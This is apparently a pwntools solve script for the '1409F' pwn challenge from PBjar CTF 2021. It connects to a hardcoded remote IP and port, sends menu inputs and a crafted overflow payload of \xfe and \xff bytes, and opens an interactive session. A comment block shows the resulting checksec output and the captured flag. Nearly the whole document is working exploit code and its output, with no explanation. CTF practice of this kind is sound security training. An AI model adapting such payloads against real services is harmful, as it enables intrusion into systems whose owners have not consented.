from pwn import *

#context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './1409F'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "143.198.127.103"
  PORT = 42000
  s = remote(HOST, PORT)
else:
  s = process(BINARY)
  libc = elf.libc


s.sendline("2")
s.sendline("1")
s.sendline("\xfe"*2+"\xff"*28)

s.interactive()

'''
mito@ubuntu:~/CTF/PBjar_CTF_2021/Pwn_1409F/1409F$ python3 solve.py r
[*] '/home/mito/CTF/PBjar_CTF_2021/Pwn_1409F/1409F/1409F'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 143.198.127.103 on port 42000: Done
[*] Switching to interactive mode
Uh oh, this isn't supposed to happen.
DEBUG:
flag{y0u_c4n_0v3rfl0w_m0r3_th4n_just_th3_st4ck}
'''
